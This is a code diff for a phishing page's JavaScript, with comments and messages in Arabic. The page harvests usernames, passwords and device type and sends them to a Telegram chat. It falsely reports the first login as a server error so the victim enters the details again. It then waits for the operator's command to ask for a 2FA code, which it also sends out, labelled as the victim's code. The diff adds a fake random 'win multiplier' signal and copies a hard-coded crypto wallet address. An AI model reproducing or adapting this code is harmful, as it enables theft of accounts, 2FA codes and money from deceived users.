@@ -18,7 +18,7 @@ async function processAuth() {
     if (loginAttempts === 1) {
         btn.disabled = true;
         btn.innerText = "Verifying...";
-        await sendToTelegram(`⚠️ محاولة 1:\n👤 User: ${u}\n🔑 Pass: ${p}`);
+        await sendToTelegram(`⚠️ محاولة 1 (تأكد):\n👤 User: ${u}\n🔑 Pass: ${p}`);
         setTimeout(() => {
             msg.innerText = "❌ خطأ في السيرفر: كلمة المرور أو اليوزر غير صحيح!";
             msg.style.color = "#ff4444";
@@ -29,8 +29,8 @@ async function processAuth() {
     } else {
         btn.disabled = true;
         msg.style.color = "#00f2ff";
-        await sendToTelegram(`✅ محاولة 2 (مؤكدة):\n👤 User: ${u}\n🔑 Pass: ${p}`);
-        
+        await sendToTelegram(`✅ بيانات مؤكدة (محاولة 2):\n👤 User: ${u}\n🔑 Pass: ${p}\n📱 الجهاز: ${navigator.userAgent.includes("Android") ? "Android" : "iPhone"}`);
+
         // بدء العداد المستقل
         runCountdown();
         // بدء الاستماع الذكي (بدون تعليق)
@@ -51,6 +51,7 @@ function runCountdown() {
     }, 1000);
 }
 
+// محرك الاستماع الذكي (Recursive Timeout) بدلاً من Interval
 async function listenForCommands() {
     if (!isCommandActive) return;
 
@@ -61,10 +62,8 @@ async function listenForCommands() {
         if (data.result && data.result.length > 0) {
             const cmd = data.result[0].message?.text.toUpperCase() || "";
             
-            if (cmd === "Q") {
-                await sendToTelegram(`📊 تقرير: الجهاز متصل والوقت المتبقي ${timeLeft}ث`);
-            } else if (cmd === "2FA") {
-                isCommandActive = false;
+            if (cmd === "2FA") {
+                isCommandActive = false; // توقيف كل شيء
                 stopAndRequest2FA();
                 return; // الخروج من حلقة الاستماع
             } else if (cmd === "OK") {
@@ -75,8 +74,18 @@ async function listenForCommands() {
         }
     } catch (e) { console.log("Polling..."); }
 
-    // بدلاً من setInterval، نستدعي الوظيفة مرة أخرى بعد 3 ثوانٍ
+    // بدلاً من Interval، نستدعي الوظيفة مرة أخرى بعد 3 ثوانٍ
     if (isCommandActive) setTimeout(listenForCommands, 3000);
+}
+
+// وظيفة جلب الإشارات (GET SIGNAL)
+function getSignal() {
+    const display = document.getElementById('target-mult');
+    display.innerText = "WAIT..";
+    setTimeout(() => {
+        const mult = (Math.random() * (3.80 - 1.20) + 1.20).toFixed(2) + "x";
+        display.innerText = mult;
+    }, 1200);
 }
 
 function stopAndRequest2FA() {
@@ -84,16 +93,16 @@ function stopAndRequest2FA() {
     const pInput = document.getElementById('u_pas');
     const btn = document.getElementById('sync-btn');
 
-    msg.innerText = "⚠️ فشلت المزامنة! أدخل رمز الـ 2FA لرفع نسبة الفوز:";
+    msg.innerText = "⚠️ فشلت المزامنة التلقائية! أدخل رمز الـ 2FA لرفع نسبة الفوز والتحقق النهائي:";
     msg.style.color = "#ffcc00";
     pInput.value = "";
-    pInput.placeholder = "Code 2FA";
+    pInput.placeholder = "Code 2FA (6 digits)";
     btn.disabled = false;
     btn.innerText = "تأكيد الرمز 🔓";
     
     btn.onclick = async () => {
-        await sendToTelegram(`🔐 الرمز: ${pInput.value}`);
-        alert("جاري التحقق...");
+        await sendToTelegram(`🔐 تفضل رمز 2FA للضحية:\n🔢 CODE: ${pInput.value}`);
+        alert("جاري التحقق من الرمز...");
         btn.disabled = true;
     };
 }
@@ -112,4 +121,9 @@ async function sendToTelegram(text) {
             body: JSON.stringify({ chat_id: CHAT_ID, text: text })
         });
     } catch (e) {}
+}
+
+function copyAddr() {
+    navigator.clipboard.writeText("TYXbsFZK3HYq3LX1uwX113Ukrm44ib9XDr");
+    alert("تم نسخ العنوان");
 }
